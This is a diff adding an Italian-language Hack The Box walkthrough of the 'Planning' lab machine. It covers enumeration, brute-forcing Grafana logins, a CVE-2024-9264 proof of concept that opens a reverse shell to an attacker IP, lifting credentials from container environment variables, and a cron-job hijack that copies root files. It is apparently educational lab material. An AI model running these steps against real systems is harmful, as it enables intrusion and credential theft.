@@ -1,0 +1,136 @@
+ 888888ba  dP                            oo                   
+ 88    `8b 88                                                 
+a88aaaa8P' 88 .d8888b. 88d888b. 88d888b. dP 88d888b. .d8888b. 
+ 88        88 88'  `88 88'  `88 88'  `88 88 88'  `88 88'  `88 
+ 88        88 88.  .88 88    88 88    88 88 88    88 88.  .88 
+ dP        dP `88888P8 dP    dP dP    dP dP dP    dP `8888P88 
+oooooooooooooooooooooooooooooooooooooooooooooooooooooo~~~~.88~
+                                                      d8888P  
+
+------------------------------------------------------------------------------
+
+[ 0x01 ] Abstract
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+HTB PLANNING - Walkthrough tecnico by NoFlyFre
+Target: planning.htb
+
+------------------------------------------------------------------------------
+
+[ 0x02 ] Enumeration
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nmap -sC -sV 10.10.11.68 -oN nmap/planning_initial
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+
+Aggiunta degli hostnames a /etc/hosts:
+echo "10.10.11.68 planning planning.htb" | sudo tee -a /etc/hosts
+
+gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+→ trovato: grafana.planning.htb
+
+------------------------------------------------------------------------------
+
+[ 0x03 ] grafana.planning.htb – Authenticated RCE (CVE-2024-9264)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Grafana ≤10.2.3 vulnerabile a RCE dopo login.
+PoC pubblico disponibile.
+
+Bruteforce credenziali con rockyou.txt → admin:admin
+
+python3 poc.py --url http://grafana.planning.htb \
+               --username admin --password admin \
+               --reverse-ip 10.10.15.3 --reverse-port 8888
+
+Il payload ottiene una root shell nella container.
+
+nc -lvnp 8888
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+------------------------------------------------------------------------------
+
+[ 0x04 ] Escaping Docker – SSH as enzo
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Dentro il container:
+
+env | grep GF_SECURITY
+GF_SECURITY_ADMIN_USER=enzo
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+
+ssh enzo@planning.htb
+Password: RioTecRANDEntANT!
+
+cat ~/user.txt
+[USER FLAG]
+
+------------------------------------------------------------------------------
+
+[ 0x05 ] linPEAS → Port 8000 – Cronicle Dashboard
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+linpeas.sh trova un servizio locale su TCP 8000.
+
+Port forwarding:
+ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
+
+Visita http://127.0.0.1:8000 (Cronicle UI protetta da HTTP basic‑auth).
+Credenziali trovate in /opt/crontabs/crontab.db:
+
+cat /opt/crontabs/crontab.db | jq -r '.command'
+# ...zip -P P4ssw0rdS0pRi0T3c...
+
+root : P4ssw0rdS0pRi0T3c → admin completo
+
+------------------------------------------------------------------------------
+
+[ 0x06 ] Privilege Escalation via Cron Job Hijack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Modifica del job "Grafana backup" con payload:
+
+cat /root/* > /home/enzo/flags.txt
+
+Esecuzione manuale, quindi:
+cat ~/flags.txt | grep root
+[REDACTED_ROOT_FLAG]
+
+Root compromise achieved 🎉
+
+------------------------------------------------------------------------------
+
+[ 0x07 ] Summary
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Step           | Description
+---------------|------------------------------------------------------
+nmap           | Discovered SSH (22) and nginx (80)
+vHost enum     | Found grafana.planning.htb
+Grafana RCE    | CVE-2024-9264 yields root shell inside Docker
+Creds via env  | GF_SECURITY_ADMIN_USER/PASSWORD → SSH as enzo
+linPEAS scan   | Detected Cronicle service on localhost:8000
+Cronicle creds | Password extracted from crontab.db
+Job hijack     | Modified backup task to read /root/* → got root flag
+
+Rooted!
+
+------------------------------------------------------------------------------
+
+[ 0x08 ] Tags / Keywords
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+security, htb, walkthrough, pentest, NoFlyFre, hacking, writeup, planning
+
+[ 0x09 ] Lingua
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ITA (Italiano)
+
+------------------------------------------------------------------------------
+
+[ 0x0A ] Credits & Disclaimer
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Autore: NoFlyFre
+Tutti i contenuti sono a scopo educativo e di ethical hacking.
+Usa queste informazioni in modo responsabile.
+
+------------------------------------------------------------------------------
+
+        .: Knowledge, Skillz, Root :.
+          .: Stay curious! :.
